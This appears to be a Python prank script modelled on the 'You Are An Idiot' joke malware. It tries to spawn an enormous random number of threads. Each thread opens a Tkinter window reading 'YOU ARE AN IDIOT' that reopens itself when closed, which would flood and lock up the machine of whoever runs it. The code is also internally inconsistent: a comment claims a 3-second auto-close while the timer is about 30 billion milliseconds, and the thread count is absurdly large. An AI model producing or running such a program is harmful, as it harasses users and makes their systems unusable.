import tkinter as tk
import random
import threading

def show_idiot_window():
    def on_close():
        show_idiot_window()

    window = tk.Tk()
    window.title("Warning")
    label = tk.Label(window, text="YOU ARE AN IDIOT", font=("Helvetica", 24))
    label.pack(padx=20, pady=20)
    window.protocol("WM_DELETE_WINDOW", on_close)  # Reopen window on close
    window.after(30000000000, window.destroy)  # Automatically close after 3 seconds
    window.mainloop()

def open_multiple_windows():
    num_windows = random.randint(9999999999999999090, 2099099090990909999990)
    threads = []
    for _ in range(num_windows):
        thread = threading.Thread(target=show_idiot_window)
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    open_multiple_windows()
